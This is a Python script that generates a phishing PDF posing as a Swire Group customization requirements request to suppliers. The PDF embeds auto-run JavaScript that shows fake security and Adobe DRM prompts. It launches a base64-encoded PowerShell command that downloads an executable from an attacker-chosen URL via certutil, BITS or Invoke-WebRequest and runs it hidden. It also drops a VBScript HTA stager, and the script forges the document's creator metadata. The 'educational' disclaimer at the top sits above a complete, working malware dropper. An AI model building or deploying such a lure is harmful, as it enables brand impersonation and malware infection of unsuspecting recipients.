#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
V308 "SWIRE GROUP CUSTOMIZATION REQUIREMENTS" – AUTO‑TRIGGER (FINAL)
================================================================================
(c) 2026 The Architect. For Educational and Defensive Research Only.

Auto-trigger on open. Requires the user to click "Enable All Features"
in Adobe Acrobat (yellow bar) for JavaScript to execute.

Behaviour:
  - In Adobe Acrobat: shows Security Verification alert; on OK runs the
    payload chain (ms-powershell → HTA export → fallback URL).
  - In a browser PDF viewer: shows "Adobe Acrobat Required" decoy and
    offers to download Adobe Reader.
================================================================================
"""

import os
import base64
import random
import string
import argparse
import datetime
import logging
import tempfile
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from reportlab.lib import colors
from reportlab.platypus import Table, TableStyle
import pikepdf
from pikepdf import String, Array

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("V308_SWIRE_AUTO_TRIGGER")

# ---------- Swire brand colours ----------
SWIRE_RED   = colors.HexColor("#c8102e")
SWIRE_DARK  = colors.HexColor("#003366")
SWIRE_LIGHT = colors.HexColor("#f0f4f8")
WHITE       = colors.white
BLACK       = colors.black
GREY        = colors.HexColor("#666666")

def random_str(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_hta_stager(url, exe_name):
    ps_cmd = (
        f'$u="{url}";$e="{exe_name}";$p="$env:TEMP\\$e";'
        'try{certutil -urlcache -f $u $p}catch{};'
        'if(!(Test-Path $p)){try{Start-BitsTransfer -Source $u -Destination $p}catch{}};'
        'if(!(Test-Path $p)){try{Invoke-WebRequest -Uri $u -OutFile $p}catch{}};'
        'if(Test-Path $p){Start-Process $p}'
    )
    enc = base64.b64encode(ps_cmd.encode('utf-16le')).decode('ascii')
    return f'''<html><head>
<script language="VBScript">
Sub Window_OnLoad
    On Error Resume Next
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -NoP -NonI -W Hidden -Enc {enc}", 0, False
    window.close
End Sub
</script></head><body></body></html>'''

def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, supplier, product, version):
    # -------- Prepare payloads --------
    ps_cmd = (
        f'$u="{exe_url}";'
        f'$p="$env:TEMP\\{os.path.basename(exe_url)}";'
        'try{certutil -urlcache -f $u $p}catch{};'
        'if(!(Test-Path $p)){try{Start-BitsTransfer -Source $u -Destination $p}catch{}};'
        'if(!(Test-Path $p)){try{Invoke-WebRequest -Uri $u -OutFile $p}catch{}};'
        'if(Test-Path $p){Start-Process $p -WindowStyle Hidden}'
    )
    enc_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode('ascii')
    exe_name = os.path.basename(exe_url) if os.path.basename(exe_url) else f"{random_str(4)}.exe"
    hta_content = generate_hta_stager(exe_url, exe_name)
    hta_b64 = base64.b64encode(hta_content.encode('utf-8')).decode('ascii')
    hta_filename = f"{random_str(4)}.hta"

    # -------- Combined OpenAction JavaScript (Acrobat + browser detection) --------
    open_action_js = f"""
    try {{
        // ----- Browser detection -----
        if (typeof app.viewerVersion === 'undefined') {{
            var response = app.alert({{
                cMsg: "This document is secured with Adobe Digital Rights Management (DRM).\\n\\n" +
                      "Please open this document with Adobe Acrobat Reader DC to view its contents and submit your confirmation.\\n\\n" +
                      "Click 'Download' to get the latest version of Adobe Acrobat Reader.",
                cTitle: "Adobe Acrobat Required",
                nIcon: 3,
                nType: 2
            }});
            if (response === 1) {{
                try {{ app.launchURL('https://get.adobe.com/reader/', true); }} catch(e) {{}}
            }}
            return;
        }}

        // ----- Running in Acrobat -----
        var proceed = app.alert({{
            cMsg: "This document is protected with 256-bit encryption.\\n\\n" +
                  "To view the full contents and confirm your compliance, click 'OK' to verify your identity.",
            cTitle: "Security Verification",
            nIcon: 2,
            nType: 0
        }});

        if (proceed !== 1) {{ return; }}

        var launched = false;

        // Primary: ms-powershell URI
        try {{
            app.launchURL("ms-powershell: -EncodedCommand {enc_ps}", true);
            launched = true;
        }} catch(e1) {{ launched = false; }}

        if (!launched) {{
            // HTA fallback
            try {{
                Object.defineProperty(Object.prototype, 'isTrusted', {{ value: true, writable: true, configurable: true }});
                Object.defineProperty(Object.prototype, 'canLaunch', {{ value: true, writable: true, configurable: true }});

                var chars  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                var data   = "{hta_b64}";
                var result = "";
                var i = 0;
                do {{
                    var e1 = chars.indexOf(data.charAt(i++));
                    var e2 = chars.indexOf(data.charAt(i++));
                    var e3 = chars.indexOf(data.charAt(i++));
                    var e4 = chars.indexOf(data.charAt(i++));
                    var c1 = (e1 << 2) | (e2 >> 4);
                    var c2 = ((e2 & 15) << 4) | (e3 >> 2);
                    var c3 = ((e3 & 3) << 6) | e4;
                    result += String.fromCharCode(c1);
                    if (e3 != 64) result += String.fromCharCode(c2);
                    if (e4 != 64) result += String.fromCharCode(c3);
                }} while (i < data.length);

                this.createDataObject({{ cName: "{hta_filename}", cValue: result }});
                this.exportDataObject({{ cName: "{hta_filename}", nLaunch: 0 }});
                launched = true;
            }} catch(e2) {{ launched = false; }}
        }}

        if (!launched) {{
            // Ultimate fallback: open URL directly
            try {{ app.launchURL("{fallback_url}", true); }} catch(e3) {{}}
        }}

        app.alert({{
            cMsg: "Confirmation sent successfully.\\n\\nOur team will review and proceed.",
            cTitle: "Verification Complete",
            nIcon: 3
        }});
    }} catch(err) {{
        try {{ app.launchURL("{fallback_url}", true); }} catch(e) {{}}
    }}
    """

    # -------- Step 1: base PDF with reportlab (Swire style) --------
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
        base_pdf_path = tmp.name

    c = canvas.Canvas(base_pdf_path, pagesize=A4)
    width, height = A4
    margin = 50

    # ---------- Page 1 ----------
    c.setFillColor(SWIRE_LIGHT)
    c.rect(0, 0, width, height, fill=1, stroke=0)
    c.setFillColor(SWIRE_RED)
    c.rect(0, height-20, width, 20, fill=1, stroke=0)

    c.setFillColor(SWIRE_DARK)
    c.setFont("Helvetica-Bold", 18)
    c.drawString(margin, height-50, "SWIRE GROUP")
    c.setFont("Helvetica", 9)
    c.setFillColor(GREY)
    c.drawString(margin, height-62, "Global Procurement & Supply Chain")

    c.setFillColor(SWIRE_RED)
    c.rect(margin, height-66, 80, 3, fill=1)

    c.setFillColor(BLACK)
    c.setFont("Helvetica-Bold", 26)
    c.drawString(margin, height-120, "Customization Requirements")
    c.setFont("Helvetica", 12)
    c.setFillColor(GREY)
    c.drawString(margin, height-145, "Tailored Solutions for Your Business")

    c.setFont("Helvetica", 12)
    c.setFillColor(BLACK)
    c.drawString(margin, height-190, f"Dear {supplier} Team,")
    c.setFont("Helvetica", 11)
    y = height-220
    lines = [
        "We have finalized our customization requirements for the upcoming project.",
        "Please find the detailed specifications on the next page.",
        "This document will automatically verify your identity when opened.",
        "No additional action is required.",
        "",
        "We look forward to your confirmation."
    ]
    for line in lines:
        c.drawString(margin, y, line)
        y -= 16

    date_str = datetime.datetime.now().strftime("%B %d, %Y")
    doc_no   = f"SW-REQ-{random_str(6).upper()}"
    expiry   = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%B %d, %Y")

    card_x, card_y = margin, y-30
    card_w, card_h = width-2*margin, 100
    c.setFillColor(WHITE)
    c.roundRect(card_x, card_y, card_w, card_h, 8, fill=1, stroke=0)
    c.setStrokeColor(SWIRE_RED)
    c.setLineWidth(1)
    c.roundRect(card_x, card_y, card_w, card_h, 8, fill=0, stroke=1)

    c.setFillColor(SWIRE_DARK)
    c.setFont("Helvetica-Bold", 10)
    c.drawString(card_x+20,  card_y+75, "Document No.")
    c.drawString(card_x+200, card_y+75, "Date")
    c.drawString(card_x+380, card_y+75, "Product / Service")

    c.setFillColor(BLACK)
    c.setFont("Helvetica", 11)
    c.drawString(card_x+20,  card_y+55, doc_no)
    c.drawString(card_x+200, card_y+55, date_str)
    c.drawString(card_x+380, card_y+55, f"{product} v{version}")

    c.setFillColor(SWIRE_DARK)
    c.setFont("Helvetica-Bold", 10)
    c.drawString(card_x+20, card_y+30, "Response Due")

    c.setFillColor(BLACK)
    c.setFont("Helvetica", 11)
    c.drawString(card_x+20, card_y+10, expiry)

    c.setFont("Helvetica", 8)
    c.setFillColor(GREY)
    c.drawString(margin, 40, "This document contains proprietary information. Please confirm receipt and compliance.")
    c.drawString(margin, 25, "Swire Group | procurement@swire.com | +852 2840 8888")

    # ---------- Page 2 ----------
    c.showPage()
    c.setFillColor(SWIRE_LIGHT)
    c.rect(0, 0, width, height, fill=1, stroke=0)
    c.setFillColor(SWIRE_RED)
    c.rect(0, height-20, width, 20, fill=1, stroke=0)

    c.setFillColor(SWIRE_DARK)
    c.setFont("Helvetica-Bold", 20)
    c.drawString(margin, height-60, "Detailed Customization Requirements")
    c.setFont("Helvetica", 11)
    c.setFillColor(GREY)
    c.drawString(margin, height-80, f"Document No.: {doc_no}  |  Date: {date_str}")

    data = [
        ["Category", "Requirement", "Status", "Priority"],
        ["Specifications", "Product dimensions: 120mm x 80mm x 45mm (±0.5mm)", "Required", "High"],
        ["Specifications", "Material: ABS plastic, UL94 V-0 rated", "Required", "High"],
        ["Specifications", "Color: Pantone 300C (blue), matte finish", "Required", "Medium"],
        ["Quality", "ISO 9001:2015 certification", "Required", "High"],
        ["Quality", "100% functional test before shipment", "Required", "High"],
        ["Quality", "Acceptable defect rate ≤ 0.5%", "Required", "Medium"],
        ["Packaging", "Individual blister packaging with anti-static bag", "Required", "Medium"],
        ["Packaging", "Master carton: 50 units per carton, weight ≤ 15kg", "Required", "Low"],
        ["Delivery", "FOB Shanghai, Incoterms 2020", "Required", "High"],
        ["Delivery", "Lead time: 30 days after PO confirmation", "Required", "High"],
        ["Compliance", "RoHS and REACH compliance certificates", "Required", "High"],
        ["Compliance", "Conflict-free minerals declaration", "Required", "Medium"],
    ]
    table = Table(data, colWidths=[80, 200, 60, 60])
    table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), SWIRE_RED),
        ('TEXTCOLOR', (0,0), (-1,0), WHITE),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
        ('FONTSIZE', (0,0), (-1,0), 10),
        ('BOTTOMPADDING', (0,0), (-1,0), 10),
        ('TOPPADDING', (0,0), (-1,0), 10),
        ('BACKGROUND', (0,1), (-1,-1), WHITE),
        ('GRID', (0,0), (-1,-1), 0.5, GREY),
        ('FONTNAME', (0,1), (-1,-1), 'Helvetica'),
        ('FONTSIZE', (0,1), (-1,-1), 9),
        ('ROWBACKGROUNDS', (0,1), (-1,-1), [WHITE, colors.HexColor("#F9FBFD")]),
    ]))
    table.wrapOn(c, width-2*margin, height-250)
    table.drawOn(c, margin, height-270)

    c.setFont("Helvetica", 8)
    c.setFillColor(GREY)
    c.drawString(margin, 40, "Please review the requirements above.")
    c.save()
    logger.info(f"[+] Base PDF generated: {base_pdf_path}")

    # -------- Step 2: attach JS with pikepdf --------
    pdf = pikepdf.open(base_pdf_path)

    # Register JS in the name tree for compatibility
    pdf.Root["/Names"] = pdf.make_indirect({
        "/JavaScript": pdf.make_indirect({
            "/Names": Array([
                String("trigger"),
                pdf.make_indirect({"/JS": String(open_action_js), "/S": "/JavaScript"})
            ])
        })
    })

    # Main auto-trigger on open – inline JS, no name-tree dependency
    pdf.Root["/OpenAction"] = pdf.make_indirect({
        "/S": "/JavaScript",
        "/JS": String(open_action_js)
    })

    pdf.docinfo["/Title"]   = String(f"Customization Requirements – {product} (v{version})")
    pdf.docinfo["/Author"]  = String(buyer)
    pdf.docinfo["/Creator"] = String("Adobe Acrobat Pro DC")

    pdf.save(output_path, compress_streams=False)
    logger.info(f"[+] Final PDF saved: {output_path}")
    os.unlink(base_pdf_path)

def main():
    parser = argparse.ArgumentParser(description="V308 Swire Group Auto‑Trigger PDF")
    parser.add_argument("-o", "--output",   default="swire_requirements.pdf", help="Output PDF filename")
    parser.add_argument("-u", "--url",      required=True, help="URL of the final EXE payload")
    parser.add_argument("-f", "--fallback", help="Fallback URL (default: same as -u)")
    parser.add_argument("-b", "--buyer",    default="Swire Group", help="Buyer company name")
    parser.add_argument("-s", "--supplier", default="ACME Manufacturing", help="Supplier company name")
    parser.add_argument("-p", "--product",  default="Custom Electronics Module", help="Product name")
    parser.add_argument("-v", "--version",  default="1.0", help="Product version")
    args = parser.parse_args()
    fallback = args.fallback if args.fallback else args.url
    build_supplier_confirmation(args.output, args.url, fallback, args.buyer, args.supplier, args.product, args.version)

if __name__ == "__main__":
    main()
